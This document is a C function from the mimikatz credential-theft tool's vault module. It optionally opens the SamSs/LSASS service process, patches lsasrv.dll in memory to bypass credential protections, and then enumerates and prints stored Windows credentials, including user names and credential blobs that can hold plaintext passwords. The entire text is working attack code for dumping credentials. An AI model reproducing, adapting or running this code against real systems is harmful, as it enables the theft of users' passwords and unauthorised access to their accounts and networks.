NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
{
    DWORD credCount, i, j;
    PCREDENTIAL * pCredential = NULL;
    DWORD flags = 0;
    SERVICE_STATUS_PROCESS ServiceStatusProcess;
    PKULL_M_MEMORY_HANDLE hMemory;
    KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
    KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleSamSrv;
    HANDLE hSamSs;
    KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &hLocalMemory}, aPatchMemory = {NULL, &hLocalMemory};
    KULL_M_MEMORY_SEARCH sMemory;
    PKULL_M_PATCH_GENERIC CredpCloneCredentialReference;

    static BOOL isPatching = FALSE;
    if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
    {
        if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), MIMIKATZ_NT_BUILD_NUMBER))
        {
            aPatternMemory.address = CredpCloneCredentialReference->Search.Pattern;
            aPatchMemory.address = CredpCloneCredentialReference->Patch.Pattern;
            if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
            {
                if(hSamSs = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
                {
                    if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hSamSs, &hMemory))
                    {
                        if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"lsasrv.dll", &iModuleSamSrv))
                        {
                            sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
                            sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
                            isPatching = TRUE;
                            if(!kull_m_patch(&sMemory, &aPatternMemory, CredpCloneCredentialReference->Search.Length, &aPatchMemory, CredpCloneCredentialReference->Patch.Length, CredpCloneCredentialReference->Offsets.off0, kuhl_m_vault_cred, argc, argv, NULL))
                                PRINT_ERROR_AUTO(L"kull_m_patch");
                            isPatching = FALSE;
                        } else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
                        kull_m_memory_close(hMemory);
                    }
                } else PRINT_ERROR_AUTO(L"OpenProcess");
            } else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
        }
    }
    else
    {
        do
        {
            if(CredEnumerate(NULL, flags, &credCount, &pCredential))
            {
                for(i = 0; i < credCount; i++)
                {
                    kprintf(L"TargetName : %s / %s\n"
                            L"UserName   : %s\n"
                            L"Comment    : %s\n"
                            L"Type       : %u - %s\n"
                            L"Persist    : %u - %s\n"
                            L"Flags      : %08x\n",
                            pCredential[i]->TargetName ? pCredential[i]->TargetName : L"<NULL>",  pCredential[i]->TargetAlias ? pCredential[i]->TargetAlias : L"<NULL>",
                            pCredential[i]->UserName ? pCredential[i]->UserName : L"<NULL>",
                            pCredential[i]->Comment ? pCredential[i]->Comment : L"<NULL>",
                            pCredential[i]->Type, kull_m_cred_CredType(pCredential[i]->Type),
                            pCredential[i]->Persist, kull_m_cred_CredPersist(pCredential[i]->Persist),
                            pCredential[i]->Flags
                           );
                    kprintf(L"Credential : ");
                    kull_m_string_printSuspectUnicodeString(pCredential[i]->CredentialBlob, pCredential[i]->CredentialBlobSize);
                    kprintf(L"\n"
                            L"Attributes : %u\n", pCredential[i]->AttributeCount
                           );
                    if(kull_m_string_args_byName(argc, argv, L"attributes", NULL, NULL))
                    {
                        for(j = 0; j < pCredential[i]->AttributeCount; j++)
                        {
                            kprintf(L" [%2u] Attribute\n", j);
                            kprintf(L"  Flags   : %08x - %u\n", pCredential[i]->Attributes[j].Flags, pCredential[i]->Attributes[j].Flags);
                            kprintf(L"  Keyword : %s\n", pCredential[i]->Attributes[j].Keyword);
                            kprintf(L"  Value   : ");
                            kull_m_string_printSuspectUnicodeString(pCredential[i]->Attributes[j].Value, pCredential[i]->Attributes[j].ValueSize);
                            kprintf(L"\n");
                        }
                    }
                    kprintf(L"\n");
                }
                CredFree(pCredential);
            }
            flags++;
        } while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MIMIKATZ_NT_MAJOR_VERSION > 5));
    }
    return STATUS_SUCCESS;
}